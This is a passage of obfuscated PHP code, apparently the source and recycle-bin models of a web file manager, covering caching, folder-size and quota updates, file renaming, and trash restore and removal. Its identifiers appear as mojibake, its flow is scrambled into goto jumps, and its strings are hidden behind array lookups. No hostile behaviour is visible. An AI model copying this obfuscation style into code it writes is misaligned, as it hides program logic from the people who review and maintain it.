!1; $bﬂ£âÛÊÏŸ = intval($bﬂ£âÛÊÏŸ); goto DåÜ∏¯Ø©◊; a¥àÇë…≠ÿ: } public static $cachePathInfoMore = array(); public function pathInfoMore($d•¥„»ìÁä) { goto eƒü“ê£Ù˜; dˆ¿¶“›÷ö: $AÚç∆åñ¶ú = $this->pathInfo($d•¥„»ìÁä); if (!$AÚç∆åñ¶ú) { return !1; } if ($AÚç∆åñ¶ú[$bãﬁÈüÈ¶ﬂ[403]] == $bãﬁÈüÈ¶ﬂ[87]) { $AÚç∆åñ¶ú[$bãﬁÈüÈ¶ﬂ[81]] = $this->folderChildrenNumber($d•¥„»ìÁä); } goto E÷√íéﬁ˜÷; E÷√íéﬁ˜÷: self::$cachePathInfoMore[$d•¥„»ìÁä] = $AÚç∆åñ¶ú; return $AÚç∆åñ¶ú; goto c≈˜ÊÑØ∫Ú; eƒü“ê£Ù˜: $bãﬁÈüÈ¶ﬂ =& $_SERVER[ú∫]; $FèﬁÜêóüà = _get(self::$cachePathInfoMore, $d•¥„»ìÁä); if ($FèﬁÜêóüà) { return $FèﬁÜêóüà; } goto dˆ¿¶“›÷ö; c≈˜ÊÑØ∫Ú: } public function sourceInfo($bπÂÈÒäùæ) { goto bª±ì…”»∂; bª±ì…”»∂: $d¢íèÍã≠¶ =& $_SERVER[ú∫]; if (!$bπÂÈÒäùæ) { return array(); } $bπÂÈÒäùæ = intval($bπÂÈÒäùæ); goto C‹∑≤›≈ïã; F÷‘îä…ﬁ„: $dÊ’ ß™„á = $this->where(array($d¢íèÍã≠¶[395] => $bπÂÈÒäùæ))->find(); self::$cacheSourceInfo[$e§ŸıºÇöŸ] = $dÊ’ ß™„á; return self::$cacheSourceInfo[$e§ŸıºÇöŸ]; goto c¶†≠˘›à√; C‹∑≤›≈ïã: $e§ŸıºÇöŸ = $d¢íèÍã≠¶[438] . $bπÂÈÒäùæ; $AπÖàÇÓ≤™ = _get(self::$cacheSourceInfo, $e§ŸıºÇöŸ); if ($AπÖàÇÓ≤™) { return $AπÖàÇÓ≤™; } goto F÷‘îä…ﬁ„; c¶†≠˘›à√: } public function sourceCacheClear($Cúõãßúâ = false) { self::cacheClear($Cúõãßúâ); } public static function cacheClear($F ú‡¯Öú≈ = false) { $B®Ωóœä∆© =& $_SERVER[ú∫]; if ($F ú‡¯Öú≈ == !1) { goto c‚◊¯Í»Œû; cáõÇÚë¬ : return; goto Eõ’Éêü∂¨; c‚◊¯Í»Œû: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto fÛƒ§’ÖøÉ; fÛƒ§’ÖøÉ: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto cáõÇÚë¬ ; Eõ’Éêü∂¨: } unset(self::$cacheSourceInfo[$B®Ωóœä∆©[438] . $F ú‡¯Öú≈]); unset(self::$cachePathInfoMore[$F ú‡¯Öú≈]); unset(self::$cachePathInfo[$B®Ωóœä∆©[1977] . $F ú‡¯Öú≈]); unset(self::$cachePathInfo[$B®Ωóœä∆©[1978] . $F ú‡¯Öú≈]); } public function metaSet($Eí•æÊñ¿ê, $DÒ¥◊Õäññ = null, $eÊë”ãÑÑÌ = null) { $FáåÿÕ∫õ‡ = parent::metaSet($Eí•æÊñ¿ê, $DÒ¥◊Õäññ, $eÊë”ãÑÑÌ); if ($FáåÿÕ∫õ‡) { $this->sourceCacheClear($Eí•æÊñ¿ê); } return $FáåÿÕ∫õ‡; } public function pathInfoByPath($f÷¥Í’º†Ü, $Cö˜·πù‡Ë) { $eœÆ‡¥π à =& $_SERVER[ú∫]; $d∂ﬁ ≤ô¨° = !$Cö˜·πù‡Ë ? array() : explode($eœÆ‡¥π à[8], trim($Cö˜·πù‡Ë, $eœÆ‡¥π à[8])); $e•©Ò¬ƒ˘Î = $f÷¥Í’º†Ü; foreach ($d∂ﬁ ≤ô¨° as $C†∑≈àéƒÍ) { $e…†∆±‹äù = array($eœÆ‡¥π à[478] => $e•©Ò¬ƒ˘Î, $eœÆ‡¥π à[28] => $C†∑≈àéƒÍ); $Bøò¡†è´¥ = $this->where($e…†∆±‹äù)->select(); if (!$Bøò¡†è´¥) { return !1; } $Bøò¡†è´¥ = array_sort_by($Bøò¡†è´¥, $eœÆ‡¥π à[423]); $e•©Ò¬ƒ˘Î = $Bøò¡†è´¥[0][$eœÆ‡¥π à[395]]; } return $this->pathInfo($e•©Ò¬ƒ˘Î, !0); } protected function updateModifyTime($FÓΩ¨ﬂèãä) { goto cıúÕ‰∏£; b£ÇàÆïÇÚ: foreach ($FÓΩ¨ﬂèãä as $FÛ‡¬¿Ç¯∞ => $eû¿Ö™ã‰ú) { $FÓΩ¨ﬂèãä[$FÛ‡¬¿Ç¯∞] = intval($eû¿Ö™ã‰ú); $this->sourceCacheClear($eû¿Ö™ã‰ú); } $c’æï¥‰ç = array($cê∆äπóƒ“[395] => array($cê∆äπóƒ“[7], $FÓΩ¨ﬂèãä)); $B‚ååﬂﬁµØ = array($cê∆äπóƒ“[552] => USER_ID, $cê∆äπóƒ“[417] => time()); goto A…Û“≈òÇı; A…Û“≈òÇı: $this->where($c’æï¥‰ç)->save($B‚ååﬂﬁµØ); goto Cõà≥Öçä™; cıúÕ‰∏£: $cê∆äπóƒ“ =& $_SERVER[ú∫]; if (!$FÓΩ¨ﬂèãä) { return; } if (!is_array($FÓΩ¨ﬂèãä)) { $FÓΩ¨ﬂèãä = array($FÓΩ¨ﬂèãä); } goto b£ÇàÆïÇÚ; Cõà≥Öçä™: } public function folderSizeReset($EŒ ﬂ÷≤àÆ, $a≥¨»Ÿ£ø≈ = false) { goto Eî»ëùÙú≈; dÔô”‡∂‡•: $Eí‰≤ÂêﬁÊ = array($dÏ›‡ÏπÆ©[$B˘Ò”ŸèÁ∏[404]], $dÏ›‡ÏπÆ©[$B˘Ò”ŸèÁ∏[484]]); TaskRun::timeLimitCall($d º¢üì∂÷, $B˘Ò”ŸèÁ∏[1981], $Eí‰≤ÂêﬁÊ, 1.5); goto F¬ÑÆ…ﬁÃ ; D‚û“©èâÉ: $this->where($Aóä»◊©œÔ)->setAdd($B˘Ò”ŸèÁ∏[78], $a≥¨»Ÿ£ø≈); CacheLock::unlock($AŸ∞πíê±√); $d º¢üì∂÷ = $B˘Ò”ŸèÁ∏[1980] . $dÏ›‡ÏπÆ©[$B˘Ò”ŸèÁ∏[404]] . $B˘Ò”ŸèÁ∏[4] . $dÏ›‡ÏπÆ©[$B˘Ò”ŸèÁ∏[484]]; goto dÔô”‡∂‡•; c≥§õÇäõå: $fü“Ñ˜ı€Ç[] = $dÏ›‡ÏπÆ©[$B˘Ò”ŸèÁ∏[395]]; $Aóä»◊©œÔ = array($B˘Ò”ŸèÁ∏[395] => array($B˘Ò”ŸèÁ∏[411], $fü“Ñ˜ı€Ç)); if ($a≥¨»Ÿ£ø≈ < 0) { $Aóä»◊©œÔ[$B˘Ò”ŸèÁ∏[78]] = array($B˘Ò”ŸèÁ∏[972], abs($a≥¨»Ÿ£ø≈)); } goto D‚û“©èâÉ; eÉÃÌì¯Âã: $AŸ∞πíê±√ = $B˘Ò”ŸèÁ∏[1979] . $EŒ ﬂ÷≤àÆ; CacheLock::lock($AŸ∞πíê±√, 20); if ($a≥¨»Ÿ£ø≈ === !1) { $this->sourceCacheClear($EŒ ﬂ÷≤àÆ); $dÏ›‡ÏπÆ© = $this->sourceInfo($EŒ ﬂ÷≤àÆ); $Aóä»◊©œÔ = array($B˘Ò”ŸèÁ∏[394] => $EŒ ﬂ÷≤àÆ, $B˘Ò”ŸèÁ∏[422] => 0); $F£§≈èìã± = $this->where($Aóä»◊©œÔ)->sum($B˘Ò”ŸèÁ∏[78]); $a≥¨»Ÿ£ø≈ = intval($F£§≈èìã±) - intval($dÏ›‡ÏπÆ©[$B˘Ò”ŸèÁ∏[78]]); } goto f«ı˜›≥ãß; f«ı˜›≥ãß: if ($a≥¨»Ÿ£ø≈ == 0) { return CacheLock::unlock($AŸ∞πíê±√); } $fü“Ñ˜ı€Ç = $this->parentLevelArray($dÏ›‡ÏπÆ©[$B˘Ò”ŸèÁ∏[487]]); if (!$fü“Ñ˜ı€Ç) { $fü“Ñ˜ı€Ç = array(); } goto c≥§õÇäõå; Eî»ëùÙú≈: $B˘Ò”ŸèÁ∏ =& $_SERVER[ú∫]; if ($this->statusIgnoreResetSpace) { return; } $dÏ›‡ÏπÆ© = $this->sourceInfo($EŒ ﬂ÷≤àÆ); goto eÉÃÌì¯Âã; F¬ÑÆ…ﬁÃ : } public function folderSizeResetChildren($Bá÷§íœ◊ı) { goto Aêÿ ˆ≥ÂÙ; C§ß≤‰œ‚: foreach ($B∞€ßóÜìÉ as $dí´–å„û†) { $Bõ„∆·µΩé = $dí´–å„û†[$C–—÷…ÛÀÑ[478]] . $C–—÷…ÛÀÑ[33]; if (!isset($f˜˘´ß‚Œà[$Bõ„∆·µΩé])) { continue; } if ($dí´–å„û†[$C–—÷…ÛÀÑ[423]] == $f˜˘´ß‚Œà[$Bõ„∆·µΩé][$C–—÷…ÛÀÑ[423]]) { $f˜˘´ß‚Œà[$Bõ„∆·µΩé][$C–—÷…ÛÀÑ[78]] += $dí´–å„û†[$C–—÷…ÛÀÑ[78]]; } } foreach ($f˜˘´ß‚Œà as $dí´–å„û†) { $d ‹Õ“å€Ê = $this->parentLevelArray($dí´–å„û†[$C–—÷…ÛÀÑ[487]]); foreach ($d ‹Õ“å€Ê as $Bõ„∆·µΩé) { $Bõ„∆·µΩé = $Bõ„∆·µΩé . $C–—÷…ÛÀÑ[33]; if (!isset($f˜˘´ß‚Œà[$Bõ„∆·µΩé])) { continue; } if ($dí´–å„û†[$C–—÷…ÛÀÑ[423]] == $f˜˘´ß‚Œà[$Bõ„∆·µΩé][$C–—÷…ÛÀÑ[423]]) { $f˜˘´ß‚Œà[$Bõ„∆·µΩé][$C–—÷…ÛÀÑ[78]] += $dí´–å„û†[$C–—÷…ÛÀÑ[78]]; } } } $dÇÍë÷É†ú = array(); goto cÓŸ®Üáœ÷; EÕ‹ªå·ÍÇ: $C≥––À†∞ = array($C–—÷…ÛÀÑ[546] => 1, $C–—÷…ÛÀÑ[553] => array($C–—÷…ÛÀÑ[512], $A˜”»Òëò[$C–—÷…ÛÀÑ[487]] . $Bá÷§íœ◊ı . $C–—÷…ÛÀÑ[513])); $F≈Íâ£ó“» = $C–—÷…ÛÀÑ[1982]; $f˜˘´ß‚Œà = $this->field($F≈Íâ£ó“»)->where($C≥––À†∞)->select(); goto aîÜ∑«◊“ò; Aêÿ ˆ≥ÂÙ: $C–—÷…ÛÀÑ =& $_SERVER[ú∫]; $this->sourceCacheClear($Bá÷§íœ◊ı); $A˜”»Òëò = $this->sourceInfo($Bá÷§íœ◊ı); goto EÕ‹ªå·ÍÇ; e∂æÇÔÃˆù: $f˜˘´ß‚Œà[] = $A˜”»Òëò; $f˜˘´ß‚Œà = array_to_keyvalue($f˜˘´ß‚Œà, $C–—÷…ÛÀÑ[395]); foreach ($f˜˘´ß‚Œà as $B«∫ë‹’Æ“ => $dí´–å„û†) { $f˜˘´ß‚Œà[$B«∫ë‹’Æ“][$C–—÷…ÛÀÑ[1983]] = $f˜˘´ß‚Œà[$B«∫ë‹’Æ“][$C–—÷…ÛÀÑ[78]]; $f˜˘´ß‚Œà[$B«∫ë‹’Æ“][$C–—÷…ÛÀÑ[78]] = 0; } goto C§ß≤‰œ‚; cÓŸ®Üáœ÷: foreach ($f˜˘´ß‚Œà as $dí´–å„û†) { if ($dí´–å„û†[$C–—÷…ÛÀÑ[78]] == $dí´–å„û†[$C–—÷…ÛÀÑ[1983]]) { continue; } $dÇÍë÷É†ú[] = array($C–—÷…ÛÀÑ[395], $dí´–å„û†[$C–—÷…ÛÀÑ[395]], $C–—÷…ÛÀÑ[78], $dí´–å„û†[$C–—÷…ÛÀÑ[78]]); } $this->saveAll($dÇÍë÷É†ú); goto eê‚£ΩÁÙ≈; aîÜ∑«◊“ò: $C≥––À†∞[$C–—÷…ÛÀÑ[403]] = 0; $B∞€ßóÜìÉ = $this->field($F≈Íâ£ó“»)->where($C≥––À†∞)->select(); if (!$B∞€ßóÜìÉ) { return; } goto e∂æÇÔÃˆù; eê‚£ΩÁÙ≈: } public function userSpaceReset($Fèû’√Í˘Ö = false) { $BŸÜ≠˘˜ÿÙ =& $_SERVER[ú∫]; $e÷¬Ë∆â†Ò = $this->where(array($BŸÜ≠˘˜ÿÙ[404] => self::TYPE_USER, $BŸÜ≠˘˜ÿÙ[484] => $Fèû’√Í˘Ö, $BŸÜ≠˘˜ÿÙ[403] => 0))->sum($BŸÜ≠˘˜ÿÙ[78]); $e÷¬Ë∆â†Ò = !$e÷¬Ë∆â†Ò || $e÷¬Ë∆â†Ò <= 0 ? 0 : $e÷¬Ë∆â†Ò; Model($BŸÜ≠˘˜ÿÙ[502])->userEdit($Fèû’√Í˘Ö, array($BŸÜ≠˘˜ÿÙ[1678] => $e÷¬Ë∆â†Ò)); } public function targetSpaceUpdate($AãéÃ¨Òòà, $DªÂéäæ¯±) { $bìÖ†ïØ©◊ =& $_SERVER[ú∫]; if (!$DªÂéäæ¯±) { return; } if (!in_array($AãéÃ¨Òòà, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $dÌÓ•Õ˜ÚÏ = $this->targetSpaceSize($AãéÃ¨Òòà, $DªÂéäæ¯±); if ($AãéÃ¨Òòà == self::TYPE_USER) { Model($bìÖ†ïØ©◊[502])->userEdit($DªÂéäæ¯±, array($bìÖ†ïØ©◊[1678] => $dÌÓ•Õ˜ÚÏ)); } else { if ($AãéÃ¨Òòà == self::TYPE_GROUP) { Model($bìÖ†ïØ©◊[486])->groupEdit($DªÂéäæ¯±, array($bìÖ†ïØ©◊[1678] => $dÌÓ•Õ˜ÚÏ)); } } } public function targetSpaceSize($fÁéÊ≥˜ªç, $cÏ∞˘µ¶¶Ì) { goto bêÜ©√ÿß; a§◊Œß‘‘Œ: $aÜ‘»¿â≈á = array_to_keyvalue($aÜ‘»¿â≈á, $A®øÏ°©§ë[33], $A®øÏ°©§ë[395]); $aÜ‘»¿â≈á = array_unique(array_filter($aÜ‘»¿â≈á)); if ($aÜ‘»¿â≈á) { $bÛ¯©èëÖƒ = array($A®øÏ°©§ë[410] => array($A®øÏ°©§ë[411], $aÜ‘»¿â≈á)); $BÊ£Íá‘Œ≥ += floatval($this->where($bÛ¯©èëÖƒ)->sum($A®øÏ°©§ë[78])); } goto Fñ¡ÚÁ≈ÇÀ; Fñ¡ÚÁ≈ÇÀ: $BÊ£Íá‘Œ≥ = !$BÊ£Íá‘Œ≥ || $BÊ£Íá‘Œ≥ <= 0 ? 0 : $BÊ£Íá‘Œ≥; return $BÊ£Íá‘Œ≥; goto aêœàÇìÎç; B≠ä√§ïŒ: $BÊ£Íá‘Œ≥ = floatval($f¢ø≈⁄Í÷æ[$A®øÏ°©§ë[78]]); $bÛ¯©èëÖƒ = array($A®øÏ°©§ë[553] => array($A®øÏ°©§ë[512], $A®øÏ°©§ë[498] . $f¢ø≈⁄Í÷æ[$A®øÏ°©§ë[395]] . $A®øÏ°©§ë[513])); $aÜ‘»¿â≈á = Model($A®øÏ°©§ë[421])->field($A®øÏ°©§ë[410])->where($bÛ¯©èëÖƒ)->select(); goto a§◊Œß‘‘Œ; bêÜ©√ÿß: $A®øÏ°©§ë =& $_SERVER[ú∫]; $f¢ø≈⁄Í÷æ = $this->sourceRoot($fÁéÊ≥˜ªç, $cÏ∞˘µ¶¶Ì, !0); if (!$f¢ø≈⁄Í÷æ) { return 0; } goto B≠ä√§ïŒ; aêœàÇìÎç: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($bø•ÚπáÑ©) { return $this->fileTypeProfile($bø•ÚπáÑ©, SourceModel::TYPE_USER); } public function groupFileTypeProfile($bµ”‘¬∂Ô) { return $this->fileTypeProfile($bµ”‘¬∂Ô, SourceModel::TYPE_GROUP); } private function fileTypeProfile($eÍˆ¬è≥Éá, $FàÍ∂ˆπ‹π) { goto a—Áæûœ„ç; d¬‚†ÔÖÁŸ: foreach ($AâÜ≤øç≠Ï as $dÓ÷¿‹ºê∆ => $dìΩµ˜¶Öê) { $Cà≥è–á√⁄[$cÈÒëÜëõØ[405]] = $this->fileTypeWhere($dÓ÷¿‹ºê∆); $Eì–¡»ìí∞[$dÓ÷¿‹ºê∆] = array($cÈÒëÜëõØ[1986] => $dìΩµ˜¶Öê[$cÈÒëÜëõØ[28]], $cÈÒëÜëõØ[1987] => $this->where($Cà≥è–á√⁄)->count(), $cÈÒëÜëõØ[548] => $this->where($Cà≥è–á√⁄)->sum($cÈÒëÜëõØ[78])); } Cache::set($cÙÃ¢÷ÖÚÈ, $Eì–¡»ìí∞, 1200); return $Eì–¡»ìí∞; goto e™âáÁÌù»; a¶È∞Ù¨ˆﬁ: if ($b„îÖ∏—ë–) { return $b„îÖ∏—ë–; } $Cà≥è–á√⁄ = array($cÈÒëÜëõØ[546] => 0); if ($eÍˆ¬è≥Éá != !1) { $Cà≥è–á√⁄[$cÈÒëÜëõØ[484]] = $eÍˆ¬è≥Éá; $Cà≥è–á√⁄[$cÈÒëÜëõØ[404]] = $FàÍ∂ˆπ‹π; } goto Dê…∆ê¨à—; a—Áæûœ„ç: $cÈÒëÜëõØ =& $_SERVER[ú∫]; $cÙÃ¢÷ÖÚÈ = $cÈÒëÜëõØ[1984] . $eÍˆ¬è≥Éá . $cÈÒëÜëõØ[71] . $FàÍ∂ˆπ‹π; $b„îÖ∏—ë– = Cache::get($cÙÃ¢÷ÖÚÈ); goto a¶È∞Ù¨ˆﬁ; Dê…∆ê¨à—: $Eì–¡»ìí∞ = array(); $Eì–¡»ìí∞[$cÈÒëÜëõØ[1985]] = array($cÈÒëÜëõØ[1986] => LNG($cÈÒëÜëõØ[1985]), $cÈÒëÜëõØ[1987] => $this->where($Cà≥è–á√⁄)->count(), $cÈÒëÜëõØ[548] => $this->where($Cà≥è–á√⁄)->sum($cÈÒëÜëõØ[78])); $AâÜ≤øç≠Ï = KodIO::fileTypeList(); goto d¬‚†ÔÖÁŸ; e™âáÁÌù»: } public function fileNameExist($fÕ‰πË∑ﬁ», $aäÇ˘è∫‹ó) { $e“∆ë ø¢ä =& $_SERVER[ú∫]; $fÓ™Ê‰·ÇÒ = $this->where(array($e“∆ë ø¢ä[478] => $fÕ‰πË∑ﬁ», $e“∆ë ø¢ä[28] => $aäÇ˘è∫‹ó, $e“∆ë ø¢ä[423] => 0))->find(); return is_array($fÓ™Ê‰·ÇÒ) ? $fÓ™Ê‰·ÇÒ[$e“∆ë ø¢ä[395]] : !1; } public function childList($Dìê¥¯ïı◊) { goto f¢ÍÛÏŒ‘õ; f¢ÍÛÏŒ‘õ: $e¡ô«´’áò =& $_SERVER[ú∫]; $eì“âÊ¢¢Ì = $e¡ô«´’áò[1962] . $Dìê¥¯ïı◊; if (isset(self::$cacheChildList[$eì“âÊ¢¢Ì])) { return self::$cacheChildList[$eì“âÊ¢¢Ì]; } goto cÙ˘®ÑµöÏ; aû‹≈≥¬Ìÿ: self::$cacheChildList[$eì“âÊ¢¢Ì] = $a§ÑëÏÉ∂á; foreach ($a§ÑëÏÉ∂á as $dÈ“‹„≈œ©) { $eì“âÊ¢¢Ì = $e¡ô«´’áò[438] . $dÈ“‹„≈œ©[$e¡ô«´’áò[395]]; self::$cacheSourceInfo[$eì“âÊ¢¢Ì] = $dÈ“‹„≈œ©; } return $a§ÑëÏÉ∂á; goto f±öøºÑõï; cÙ˘®ÑµöÏ: $e°Ç™ê¶¡ô = array($e¡ô«´’áò[478] => intval($Dìê¥¯ïı◊), $e¡ô«´’áò[423] => 0); $a§ÑëÏÉ∂á = $this->where($e°Ç™ê¶¡ô)->select(); $a§ÑëÏÉ∂á = $a§ÑëÏÉ∂á ? $a§ÑëÏÉ∂á : array(); goto aû‹≈≥¬Ìÿ; f±öøºÑõï: } public function fileNameAuto($dÀπ¬÷£ãÈ, $fì≤àíÖÈÙ, $e‡Ï»ç∆—ç = REPEAT_RENAME, $F˘·˜˜ÏÊ∞ = false) { $A√ë£Ë∂ã± =& $_SERVER[ú∫]; $bﬁÚÑ˘‡¿∞ = array($A√ë£Ë∂ã±[478] => $dÀπ¬÷£ãÈ, $A√ë£Ë∂ã±[423] => 0, $A√ë£Ë∂ã±[28] => array($A√ë£Ë∂ã±[380], $fì≤àíÖÈÙ . $A√ë£Ë∂ã±[381])); $cÌ∂√ûœâ◊ = $this->field($A√ë£Ë∂ã±[28])->where($bﬁÚÑ˘‡¿∞)->select(); $bÿø›€≥ó® = array_to_keyvalue($cÌ∂√ûœâ◊, $A√ë£Ë∂ã±[33], $A√ë£Ë∂ã±[28]); return $this->fileNameAutoGet($bÿø›€≥ó®, $fì≤àíÖÈÙ, $e‡Ï»ç∆—ç, $F˘·˜˜ÏÊ∞); } public function fileNameAutoGet($Aﬂ†ûê∞±Ç, $E—¶ŒÚÑ–Î, $E¢≠Ñ∏•Õò, $BÑ∏ª Ê≤”) { $BÁ·ËË≥›õ =& $_SERVER[ú∫]; if ($E¢≠Ñ∏•Õò == REPEAT_REPLACE || !$Aﬂ†ûê∞±Ç || !in_array_not_case($E—¶ŒÚÑ–Î, $Aﬂ†ûê∞±Ç) || $BÑ∏ª Ê≤” && $E¢≠Ñ∏•Õò != REPEAT_RENAME_FOLDER) { return $E—¶ŒÚÑ–Î; } if ($E¢≠Ñ∏•Õò == REPEAT_SKIP) { return !1; } $CÒÌÇì’éÑ = $BÁ·ËË≥›õ[95] . get_path_ext($E—¶ŒÚÑ–Î); $CÒÌÇì’éÑ = $CÒÌÇì’éÑ == $BÁ·ËË≥›õ[95] || $BÑ∏ª Ê≤” ? $BÁ·ËË≥›õ[33] : $CÒÌÇì’éÑ; for ($E”ñç§Á¯¨ = 1; $E”ñç§Á¯¨ <= count($Aﬂ†ûê∞±Ç) + 1; $E”ñç§Á¯¨++) { $DÉõ—Êå‡Æ = substr($E—¶ŒÚÑ–Î, 0, strlen($E—¶ŒÚÑ–Î) - strlen($CÒÌÇì’éÑ)); $aÃø©◊´¬¨ = $DÉõ—Êå‡Æ . "\x28{$E”ñç§Á¯¨}\x29{$CÒÌÇì’éÑ}"; if (!in_array_not_case($aÃø©◊´¬¨, $Aﬂ†ûê∞±Ç)) { return $aÃø©◊´¬¨; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\162\x63\x65\137\x72\x65\x63\x79\x63\x6c\145"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\124\x69\x6d\145", "\164\x69\x6d\145", "\151\156\x73\x65\x72\164", "\x66\165\x6e\143\x74\x69\x6f\x6e")); public function listData($aË£±…–¬© = false) { $föàÒ›Ωñ¬ =& $_SERVER[ú∫]; $aË£±…–¬© = $aË£±…–¬© ? $aË£±…–¬© : USER_ID; $CïÀ˘†©ﬁ´ = $this->where(array($föàÒ›Ωñ¬[1520] => $aË£±…–¬©))->select(); return array_to_keyvalue($CïÀ˘†©ﬁ´, $föàÒ›Ωñ¬[33], $föàÒ›Ωñ¬[395]); } public function moveToRecycle($bœ≠“µ–Ô±) { goto A¯†÷óΩÓ¥; cı◊’åÁ‰ï: if (!$a’ôœ‘®ÿê || $a’ôœ‘®ÿê[$EÑØä Æá‡[423]] == $EÑØä Æá‡[87]) { return; } $aôÎŒπ°€∫ = array($EÑØä Æá‡[410] => $bœ≠“µ–Ô±, $EÑØä Æá‡[1520] => USER_ID, $EÑØä Æá‡[549] => $a’ôœ‘®ÿê[$EÑØä Æá‡[404]], $EÑØä Æá‡[550] => $a’ôœ‘®ÿê[$EÑØä Æá‡[484]], $EÑØä Æá‡[553] => $a’ôœ‘®ÿê[$EÑØä Æá‡[487]]); $this->add($aôÎŒπ°€∫); goto dõÉÂ≠ê’ü; dõÉÂ≠ê’ü: $this->recycleMove($bœ≠“µ–Ô±, 1); if ($a’ôœ‘®ÿê[$EÑØä Æá‡[403]] == $EÑØä Æá‡[87]) { $Dÿπ€¯œø˘ = array($EÑØä Æá‡[553] => array($EÑØä Æá‡[512], $a’ôœ‘®ÿê[$EÑØä Æá‡[487]] . $bœ≠“µ–Ô± . $EÑØä Æá‡[513])); $c–©”Çèùë->where($Dÿπ€¯œø˘)->setField($EÑØä Æá‡[423], 1); } goto AàÖŒöﬂ◊ù; A¯†÷óΩÓ¥: $EÑØä Æá‡ =& $_SERVER[ú∫]; $c–©”Çèùë = Model($EÑØä Æá‡[1206]); $a’ôœ‘®ÿê = $c–©”Çèùë->sourceInfo($bœ≠“µ–Ô±); goto cı◊’åÁ‰ï; AàÖŒöﬂ◊ù: } public function clear() { $this->remove(!1); } public function remove($e‚‰ç¢ñ¡„ = false, $Fíëßõæ¨ñ = false) { goto c ØﬂŒˆïå; D•›≠¬ÍÁà: $dÃÆÿ‚Ãõ≈ = $this->listData($Fíëßõæ¨ñ); $e‚‰ç¢ñ¡„ = $e‚‰ç¢ñ¡„ === !1 ? !1 : $e‚‰ç¢ñ¡„; $EóÚÙÌÂ¡ = array(); goto e†èë‹∆„Ì; e†èë‹∆„Ì: foreach ($dÃÆÿ‚Ãõ≈ as $fÁã·∆°˜È) { if ($e‚‰ç¢ñ¡„ != !1 && !in_array($fÁã·∆°˜È, $e‚‰ç¢ñ¡„)) { continue; } $FÓÓ∆¯Ò·Ã = $fò±óÖîÙ©->sourceInfo($fÁã·∆°˜È); $fò±óÖîÙ©->remove($fÁã·∆°˜È, !1); $fÛôÉ®ª¥∑ = $FÓÓ∆¯Ò·Ã[$D·ıÜçâè∞[404]] . $D·ıÜçâè∞[71] . $FÓÓ∆¯Ò·Ã[$D·ıÜçâè∞[484]]; $EóÚÙÌÂ¡[$fÛôÉ®ª¥∑] = array($D·ıÜçâè∞[549] => $FÓÓ∆¯Ò·Ã[$D·ıÜçâè∞[404]], $D·ıÜçâè∞[484] => $FÓÓ∆¯Ò·Ã[$D·ıÜçâè∞[484]]); $this->where(array($D·ıÜçâè∞[395] => $fÁã·∆°˜È))->delete(); } foreach ($EóÚÙÌÂ¡ as $fø—îËÌŸ®) { $fò±óÖîÙ©->targetSpaceUpdate($fø—îËÌŸ®[$D·ıÜçâè∞[404]], $fø—îËÌŸ®[$D·ıÜçâè∞[484]]); } goto bÓÔ‰ã¥øå; c ØﬂŒˆïå: $D·ıÜçâè∞ =& $_SERVER[ú∫]; $Fíëßõæ¨ñ = $Fíëßõæ¨ñ ? $Fíëßõæ¨ñ : USER_ID; $fò±óÖîÙ© = Model($D·ıÜçâè∞[1206]); goto D•›≠¬ÍÁà; bÓÔ‰ã¥øå: } public function restore($d»Áø¶ ‘« = false) { $B÷Ø…ß√µ© = $this->listData(); $this->_restoreSource($B÷Ø…ß√µ©, $d»Áø¶ ‘«); } public function removeUserAll($aŒÛÁèã‡Ù) { $this->remove(!1, $aŒÛÁèã‡Ù); } private function _restoreSource($FüèËÆ∑íÎ, $Aåüø¨Öﬂ›) { goto eµøä‚⁄Æì; bìƒÛíâı†: $bç¡Ë‰™ßÒ->updateModifyTime($f∏π•ÖæÂµ); goto Cª≥Ìø·ì; eµøä‚⁄Æì: $e◊¶§π¥€ı =& $_SERVER[ú∫]; $bç¡Ë‰™ßÒ = Model($e◊¶§π¥€ı[1206]); $Aåüø¨Öﬂ› = $Aåüø¨Öﬂ› == !1 ? !1 : $Aåüø¨Öﬂ›; goto cÑßÑ⁄’Âá; cÑßÑ⁄’Âá: if (!$FüèËÆ∑íÎ) { return !0; } $f∏π•ÖæÂµ = array(); foreach ($FüèËÆ∑íÎ as $FÆ‚Í©Ü≠æ) { goto Aì§Ú„µ≈∞; Aì§Ú„µ≈∞: if ($Aåüø¨Öﬂ› != !1 && !in_array($FÆ‚Í©Ü≠æ, $Aåüø¨Öﬂ›)) { continue; } $A§Ô®‚√û√ = $bç¡Ë‰™ßÒ->sourceInfo($FÆ‚Í©Ü≠æ); $aàôË†µæê = $bç¡Ë‰™ßÒ->sourceInfo($A§Ô®‚√û√[$e◊¶§π¥€ı[478]]); goto b‰ñà∆ÙÀÀ; e¬õÊü±⁄ù: if ($A§Ô®‚√û√[$e◊¶§π¥€ı[403]] == $e◊¶§π¥€ı[87]) { $AÇŸôè»öÇ = array($e◊¶§π¥€ı[553] => array($e◊¶§π¥€ı[512], $A§Ô®‚√û√[$e◊¶§π¥€ı[487]] . $FÆ‚Í©Ü≠æ . $e◊¶§π¥€ı[513])); $bç¡Ë‰™ßÒ->where($AÇŸôè»öÇ)->setField($e◊¶§π¥€ı[423], 0); $this->restoreFolderChildren($FÆ‚Í©Ü≠æ, $FüèËÆ∑íÎ); } $this->where(array($e◊¶§π¥€ı[395] => $FÆ‚Í©Ü≠æ))->delete(); $bç¡Ë‰™ßÒ->folderSizeReset($A§Ô®‚√û√[$e◊¶§π¥€ı[478]]); goto bË©˘‡ÍÖﬁ; b‰ñà∆ÙÀÀ: if ($aàôË†µæê[$e◊¶§π¥€ı[423]] == $e◊¶§π¥€ı[87]) { continue; } $bç¡Ë‰™ßÒ->lockMoveStart($FÆ‚Í©Ü≠æ); $this->recycleMove($FÆ‚Í©Ü≠æ, 0); goto e¬õÊü±⁄ù; bË©˘‡ÍÖﬁ: $f∏π•ÖæÂµ[] = $A§Ô®‚√û√[$e◊¶§π¥€ı[478]]; if ($A§Ô®‚√û√[$e◊¶§π¥€ı[403]] == $e◊¶§π¥€ı[87]) { $f∏π•ÖæÂµ[] = $FÆ‚Í©Ü≠æ; } $bç¡Ë‰™ßÒ->lockMoveEnd($FÆ‚Í©Ü≠æ); goto eôáé¥∞äﬁ; eôáé¥∞äﬁ: } goto 